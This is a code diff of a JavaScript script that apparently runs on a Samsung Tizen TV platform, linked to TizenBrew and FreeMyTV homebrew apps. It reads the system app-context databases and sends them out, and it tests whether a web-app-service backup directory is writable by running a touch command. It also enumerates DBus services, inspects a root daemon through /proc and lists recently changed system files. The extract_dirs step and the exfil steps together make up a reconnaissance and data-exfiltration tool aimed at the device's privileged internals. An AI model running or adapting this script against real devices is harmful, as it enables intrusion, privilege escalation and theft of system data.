@@ -3,7 +3,7 @@
    1. read /opt/dbspace/.app-context_{1,2,3}.db + journals (profile DBs?) -> exfil+md5
    2. wasdb_backup: perms + write test (world-writable?)
    3. exfil: sdbd, libSLP-db-util, was, litewas, libwas_* (extraction code), vd_pkgmgr_db_recovery.sh
-   4. WAS daemon hunt (pid 327 exe/cmdline, find webappservice)
+   4. WAS daemon hunt (pid 327 exe/cmdline, find webappservice) + extract dirs check
    5. DBus: ListNames (named only) + introspect RunningAppsService + GetProcessID test
    6. /proc/locks (who holds fcntl locks on DBs)
    7. recent root files (last 90 min)
@@ -103,34 +103,12 @@ function seq(steps) {
 
 function md5Buf(b) { return crypto.createHash('md5').update(b).digest('hex'); }
 
-function readExfil(p, name) {
-  return new Promise(function (resolve) {
-    try {
-      var b = fs.readFileSync(p);
-      var out = 'size=' + b.length + ' md5=' + md5Buf(b);
-      if (b.length < 200000) { postBuf('/db_' + name, b); R.results['exfil_' + name] = b.length + 'B'; }
-      resolve(out);
-    } catch (e) { resolve('ERR ' + String(e).substring(0, 150)); }
-  });
-}
-
 var steps = [
   { name: 'profile_dbs', fn: function () {
-      var out = '';
-      var names = ['.app-context_1.db', '.app-context_2.db', '.app-context_3.db',
-                   '.app-context_1.db-journal', '.app-context_2.db-journal', '.app-context_3.db-journal'];
-      function go(idx) {
-        if (idx >= names.length) { resolve(out); return; }
-        try {
-          var b = fs.readFileSync('/opt/dbspace/' + names[idx]);
-          out += names[idx] + ': size=' + b.length + ' md5=' + md5Buf(b) + '\n';
-          if (b.length < 200000) { postBuf('/db_' + names[idx].replace(/\./g, '_'), b); R.results['exfil_' + names[idx]] = b.length + 'B'; }
-        } catch (e) { out += names[idx] + ': ERR ' + String(e).substring(0, 100) + '\n'; }
-        go(idx + 1);
-      }
-      var resolve = Promise.resolve;
-      // simpler: use Promise
       return new Promise(function (res) {
+        var out = '';
+        var names = ['.app-context_1.db', '.app-context_2.db', '.app-context_3.db',
+                     '.app-context_1.db-journal', '.app-context_2.db-journal', '.app-context_3.db-journal'];
         var i2 = 0;
         function step2() {
           if (i2 >= names.length) { res(out); return; }
@@ -146,7 +124,6 @@ var steps = [
       });
   }},
   { name: 'wasdb_backup_perm', fn: function () {
-      var out = run2 = null;
       return run('ls -la /opt/usr/apps/webappservice/wasdb_backup/ 2>&1; echo ===WRITE; touch /opt/usr/apps/webappservice/wasdb_backup/p46test && echo BACKUP_WRITABLE && rm /opt/usr/apps/webappservice/wasdb_backup/p46test || echo BACKUP_NOT_WRITABLE', 15000);
   }},
   { name: 'exfil_round2', fn: function () {
@@ -164,16 +141,19 @@ var steps = [
       return new Promise(function (resolve) { setTimeout(function () { resolve('exfil queued'); }, 25000); });
   }},
   { name: 'daemon_hunt', fn: function () {
-      return run('readlink /proc/327/exe 2>&1; echo ===CMD; cat /proc/327/cmdline 2>/dev/null | tr "\\0" " "; echo; echo ===FD; ls -la /proc/327/fd/ 2>&1 | head -15; echo ===ORG; ls -la /org/tizen/ 2>&1 | head -30; echo ===FIND; find / -xdev -name "*webappservice*" 2>/dev/null | head -20; echo ===FIND2; find /org /usr /bin -xdev -type f -name "*wasd*" 2>/dev/null | head -10', 60000);
+      return run('readlink /proc/327/exe 2>&1; echo ===CMD; cat /proc/327/cmdline 2>/dev/null | tr "\\0" " "; echo; echo ===FD; ls -la /proc/327/fd/ 2>&1 | head -15; echo ===ORG; ls -la /org/tizen/ 2>&1 | head -30; echo ===FIND; find / -xdev -name "*webappservice*" 2>/dev/null | head -20', 60000);
+  }},
+  { name: 'extract_dirs', fn: function () {
+      return run('ls -la /opt/usr/apps/ 2>/dev/null | grep -iE "xvvl|FreeMyTV|total"; echo ===XVVL; ls -la /opt/usr/apps/xvvl3S1bvH/ 2>&1 | head -20; echo ===FMTV; ls -la /opt/usr/apps/FreeMyTVio/ 2>&1 | head -20; echo ===DATAXVVL; ls -la /opt/usr/home/owner/apps_rw/xvvl3S1bvH/ 2>&1 | head -20', 20000);
   }},
   { name: 'dbus_named', fn: function () {
-      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | grep -oE "\\'[a-zA-Z0-9._:-]+\\'" | sort -u', 30000);
+      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | grep -oE "\"[a-zA-Z0-9._:-]+\"" | sort -u', 30000);
   }},
   { name: 'ras_introspect', fn: function () {
-      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -80; echo ===IFACE2; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS /org/freedesktop/DBus com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -40', 40000);
+      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -100; echo ===ROOTPATH; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS /com/native/RunningAppsServiceDBUS com.native.RunningAppsServiceDBUS.Introspect 2>&1 | head -60', 40000);
   }},
   { name: 'ras_getpid', fn: function () {
-      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetProcessID string:"xvvl3S1bvH.TizenBrew" 2>&1 | head -20; echo ===PSS; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetPssRss string:"xvvl3S1bvH.TizenBrew" 2>&1 | head -20', 40000);
+      return run('dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetProcessID string:"xvvl3S1bvH.TizenBrewStandalone" 2>&1 | head -25; echo ===PSS; dbus-send --system --print-reply --dest=com.native.RunningAppsServiceDBUS / com.native.RunningAppsServiceDBUS.GetPssRss string:"xvvl3S1bvH.TizenBrewStandalone" 2>&1 | head -25', 40000);
   }},
   { name: 'proc_locks', fn: function () {
       return run('cat /proc/locks 2>&1 | head -60', 15000);
@@ -182,7 +162,7 @@ var steps = [
       return run('find /opt /run /etc /tmp -mmin -90 -type f 2>/dev/null | grep -vE "^/tmp/" | head -40', 40000);
   }},
   { name: 'home_profiles', fn: function () {
-      return run('ls -la /opt/usr/home/ 2>&1 | head -10; echo ===; ls -la /opt/usr/home/owner/ 2>&1 | head -15; echo ===DNET; ls -la /opt/usr/data/ 2>&1 | head -12', 15000);
+      return run('ls -la /opt/usr/home/ 2>&1 | head -10; echo ===; ls -la /opt/usr/home/owner/ 2>&1 | head -15', 15000);
   }}
 ];
 
